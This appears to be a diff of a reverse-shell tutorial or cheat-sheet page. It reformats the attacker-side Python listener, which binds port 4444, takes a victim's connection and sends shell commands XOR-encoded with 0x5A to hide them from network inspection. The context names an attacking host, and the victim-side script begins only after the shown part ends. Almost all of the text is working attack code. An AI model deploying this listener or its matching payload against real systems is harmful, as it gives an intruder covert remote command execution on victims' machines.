@@ -28,27 +28,28 @@ In this example the attacking host is on IP address 10.1.2.3 and listens on port
 
 ( attacker )<br />
 [ python script ]<br />
-`#!/usr/bin/python`<br />
-`import socket`<br />
-`s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)`<br />
-`s.bind(("0.0.0.0", 4444))`<br />
-`s.listen(2)`<br />
-`print "Listening... "`<br />
-`(client, (ip, port)) = s.accept()`<br />
-`print " Received connection from : ", ip`<br />
-`while True:`<br />
-`  command = raw_input('~$ ')`<br />
-`  encode = bytearray(command)`<br />
-`  for i in range(len(encode)):`<br />
-`    encode[i] ^=0x5A`<br />
-`  client.send(encode)`<br />
-`  en_data=client.recv(2048)`<br />
-`  decode = bytearray(en_data)`<br />
-`  for i in range(len(decode)):`<br />
-`    decode[i] ^=0x5A`<br />
-`  print decode`<br />
-`client.close()`<br />
-`s.close()`<br />
+```python
+import socket
+s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind(("0.0.0.0", 4444))
+s.listen(2)
+print "Listening... "
+(client, (ip, port)) = s.accept()
+print " Received connection from : ", ip
+while True:
+  command = raw_input('~$ ')
+  encode = bytearray(command)
+  for i in range(len(encode)):
+    encode[i] ^=0x5A
+  client.send(encode)
+  en_data=client.recv(2048)
+  decode = bytearray(en_data)
+  for i in range(len(decode)):
+    decode[i] ^=0x5A
+  print decode
+client.close()
+s.close()
+```
 
 ( victim )<br />
 [ python script ]<br />
